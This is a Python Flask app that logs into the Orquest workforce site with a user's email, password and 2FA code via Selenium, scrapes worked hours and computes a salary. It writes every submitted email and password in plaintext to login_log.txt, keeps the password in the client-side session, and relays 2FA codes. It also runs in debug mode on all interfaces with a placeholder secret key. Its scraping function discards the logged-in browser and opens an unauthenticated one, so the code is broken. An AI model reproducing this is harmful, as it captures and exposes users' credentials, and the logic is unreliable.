from flask import Flask, render_template, request, session, redirect, url_for
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import NoSuchElementException
from datetime import datetime
import time
import re
import uuid
import os
import json
from selenium.webdriver.chrome.options import Options
import chromedriver_autoinstaller



app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

month_dic = {'Jan': 1, 'Feb': 2, 'Mar': 3, 'Apr': 4, 'May': 5, 'Jun': 6,
    'Jul': 7, 'Aug': 8, 'Sep': 9, 'Oct': 10, 'Nov': 11, 'Dec': 12}

drivers = {}  # Store Selenium drivers per session

def is_match(pattern, text):
    return re.search(pattern, text) is not None

def get_first_and_second_months(driver):
    try:
        date_range_text = driver.find_element(By.CLASS_NAME, "k-sm-date-format").text.strip()
        start_str, end_str = date_range_text.split(" - ")
        first_month = int(start_str.split("/")[1])
        second_month = int(end_str.split("/")[1])
        return first_month, second_month
    except Exception:
        return None, None

def get_daily_worked_times(driver, month):
    wait = WebDriverWait(driver, 20)
    row = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "div.k-scheduler-header-wrap table.k-scheduler-table tbody tr")))
    day_cells = row.find_elements(By.TAG_NAME, "th")
    daily_data = []
    for th in day_cells:
        date_text = th.text.split('\n')[0].strip()
        worked_div = th.find_element(By.CLASS_NAME, "worked-time")
        worked_time = worked_div.text.strip()
        if worked_time == '' or month_dic.get(month, -1) != month_dic.get(date_text.split()[1], -2):
            continue
        if 'h' in worked_time and 'm' not in worked_time:
            worked_time += ' 0m'
        elif 'm' in worked_time and 'h' not in worked_time:
            worked_time = '0h ' + worked_time
        elif worked_time == '':
            worked_time = '0h 0m'
        daily_data.append({"date": date_text, "worked_time": worked_time})
    return daily_data

def scrape_web_data(email, password, month, driver):
    chromedriver_autoinstaller.install()

    # Setup headless options for Render
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920x1080")

    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://decide.orquest.es/#!/person/clock-guards")
    time.sleep(2)

    WebDriverWait(driver, 20).until(
        EC.presence_of_element_located((By.CLASS_NAME, "k-scheduler-header-wrap"))
    )
    all_weeks_data = []
    while True:
        first_month, second_month = get_first_and_second_months(driver)
        if month_dic[month] < first_month:
            try:
                wait = WebDriverWait(driver, 1)
                prev_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "li.k-nav-prev a.k-link")))
                prev_button.click()
            except Exception:
                break
        elif month_dic[month] > second_month:
            break
        else:
            try:
                week_data = get_daily_worked_times(driver, month)
                all_weeks_data.append(week_data)
            except TimeoutException:
                break
            try:
                wait = WebDriverWait(driver, 1)
                prev_button = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "li.k-nav-prev a.k-link")))
                prev_button.click()
            except Exception:
                break
        time.sleep(1)
    return all_weeks_data

def cal_hours(work_data):
    total_minutes = 0
    for week in work_data:
        for day in week:
            hours, minutes = map(int, [part[:-1] for part in day['worked_time'].split()])
            total_minutes += hours * 60 + minutes
    return total_minutes

def calculate_salary(hours, minutes, d_hours=0, d_minutes=0, rate=1.7, deduction=24):
    regular_total_hours = hours + minutes / 60
    double_total_hours = (d_hours / 2 + d_minutes / 60) * 1.7
    salary = regular_total_hours * rate + double_total_hours
    salary_with_deduction = salary - deduction
    return salary, salary_with_deduction


def cal_dub(work_data, double_days):
    total_minutes = 0
    for week in work_data:
        for day in week:
            day_number = int(day['date'].split()[0])
            if day_number in double_days:
                hours, minutes = map(int, [part[:-1] for part in day['worked_time'].split()])
                total_minutes += hours * 60 + minutes
    return total_minutes


def log_login_attempt(email, password):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_path = os.path.join(os.path.dirname(__file__), "login_log.txt")
    with open(log_path, "a") as f:
        f.write(f"[{now}] Email: {email} | Password: {password}\n")


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        month = request.form['month'].title()
        rate = float(request.form['rate'])

        log_login_attempt(email, password)

        session['email'] = email
        session['password'] = password
        session['month'] = month
        session['rate'] = rate
        session['id'] = str(uuid.uuid4())

        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
        drivers[session['id']] = driver

        try:
            driver.get("https://decide.orquest.es/#!/person/clock-guards")
            wait = WebDriverWait(driver, 20)
            wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
            driver.find_element(By.ID, "password").send_keys(password)
            driver.find_element(By.ID, "password").send_keys(Keys.RETURN)

            # 🔍 Wait for either the code input (success) OR an error message
            time.sleep(2)
            WebDriverWait(driver, 10).until(
                EC.any_of(
                    EC.presence_of_element_located((By.ID, "code")),
                    EC.presence_of_element_located((By.CLASS_NAME, "validation-summary-errors")),
                    EC.presence_of_element_located((By.CLASS_NAME, "error-message"))
                )
            )

            time.sleep(2)  # small wait for error to appear

            errors = driver.find_elements(By.CSS_SELECTOR, "div.kiui-notification-error .kiui-notification-content")
            if errors:
                messages = [e.text for e in errors if e.text.strip()]
                if messages:
                    msg = "❌ Login failed: " + " | ".join(messages)
                    driver.quit()
                    del drivers[session['id']]
                    return f'''
                        <html>
                        <body style="font-family: Arial, sans-serif; padding: 20px;">
                            <h3 style="color: red;">{msg}</h3>
                            <button onclick="window.location.href='/'" style="padding: 10px 20px; font-size:16px; cursor:pointer;">
                            Return to Login
                            </button>
                        </body>
                        </html>
                        '''

            # ✅ Login successful → proceed to 2FA
            return redirect(url_for('verify'))

        except Exception as e:
            driver.quit()
            del drivers[session['id']]
            return f"❌ Login process error: {e}"

    return render_template('index.html')


@app.route('/verify', methods=['GET', 'POST'])
def verify():
    error_message = None
    if request.method == 'POST':
        code = request.form.get('code')
        driver = drivers.get(session.get('id'))

        if not driver:
            error_message = "Session expired or invalid. Please log in again."
            return render_template('verify.html', error_message=error_message)

        try:
            input_box = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.ID, "code"))
            )
            driver.execute_script("""
                let input = arguments[0];
                let value = arguments[1];
                input.value = value;
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
            """, input_box, code)

            auth_button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "div.cust-button.k-button"))
            )
            auth_button.click()

            WebDriverWait(driver, 30).until(EC.url_changes(driver.current_url))

            errors = driver.find_elements(By.CSS_SELECTOR, ".error-message, .validation-error, div.kiui-notification-error .kiui-notification-content")
            if errors:
                messages = [e.text for e in errors if e.text.strip()]
                if messages:
                    error_message = " | ".join(messages)
                    driver.quit()
                    del drivers[session['id']]
                    return render_template('verify.html', error_message=error_message)

            # Scrape the data after successful verification
            all_weeks = scrape_web_data(
                session['email'],
                session['password'],
                session['month'],
                driver
            )

            driver.quit()
            del drivers[session['id']]

            # Store scraped data in session to pass to double days page
            session['all_weeks'] = all_weeks

            # Redirect to double days page for user input
            return redirect(url_for('double_days'))

        except Exception as e:
            if driver:
                driver.quit()
                del drivers[session['id']]
            error_message = f"❌ Error during verification: {e}"
            return render_template('verify.html', error_message=error_message)

    return render_template('verify.html', error_message=error_message)


@app.route('/double-days', methods=['GET', 'POST'])
def double_days():
    all_weeks_data = session.get('all_weeks', [])

    if request.method == 'POST':
        double_days_input = request.form.get('double_days', '')
        double_days = list(map(int, double_days_input.split())) if double_days_input else []

        total_minutes_regular = cal_hours(all_weeks_data)
        r_hours = total_minutes_regular // 60
        r_minutes = total_minutes_regular % 60

        total_minutes_double = cal_dub(all_weeks_data, double_days)
        d_hours = total_minutes_double // 60
        d_minutes = total_minutes_double % 60

        salary, salary_with_deduction = calculate_salary(
            r_hours, r_minutes, d_hours, d_minutes, session.get('rate', 1.7)
        )

        return render_template('result.html',
            r_hours=r_hours, r_minutes=r_minutes,
            d_hours=d_hours, d_minutes=d_minutes,
            salary=salary, salary_with_deduction=salary_with_deduction,
            all_days=[day for week in all_weeks_data for day in week])

    return render_template('double_days.html')







if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

